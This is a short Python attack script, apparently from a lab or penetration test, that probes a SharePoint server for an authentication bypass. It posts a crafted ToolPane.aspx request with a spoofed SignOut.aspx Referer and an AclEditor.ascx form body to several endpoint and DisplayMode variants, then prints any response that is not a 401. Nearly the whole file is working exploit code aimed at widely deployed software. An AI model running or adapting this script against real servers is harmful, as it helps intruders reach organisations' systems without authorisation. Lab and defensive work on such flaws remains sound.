# Test script for endpoint and parameter variations
# Purpose: Find alternative endpoints that might bypass authentication

import requests

base_url = "http://10.10.10.166"
test_body = "MSOTlPn_DWP=test&MSOTlPn_Uri=http%3A%2F%2Fsharepoint%2F_controltemplates/15/AclEditor.ascx"

mobile_ua = "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3"
headers = {
    "User-Agent": mobile_ua,
    "Referer": "/_layouts/SignOut.aspx",
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
}

# Test different endpoints and parameters
test_cases = [
    # Original endpoint without foo parameter
    "/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
    # Different DisplayMode values
    "/_layouts/15/ToolPane.aspx?DisplayMode=View&foo=/ToolPane.aspx",
    "/_layouts/15/ToolPane.aspx?DisplayMode=Design&foo=/ToolPane.aspx",
    # Without DisplayMode
    "/_layouts/15/ToolPane.aspx?foo=/ToolPane.aspx",
    # Different layouts endpoints
    "/_layouts/15/Authenticate.aspx",
    "/_layouts/15/SignOut.aspx",
    "/_layouts/Authenticate.aspx",
    "/_layouts/SignOut.aspx",
    # Try version 16
    "/_layouts/16/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
]

for endpoint in test_cases:
    print(f"\n[*] Testing: {endpoint}")
    try:
        response = requests.post(f"{base_url}{endpoint}", headers=headers, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        if response.status_code != 401:
            print(f"    Response: {response.text[:300]}")
    except Exception as e:
        print(f"    Error: {e}")
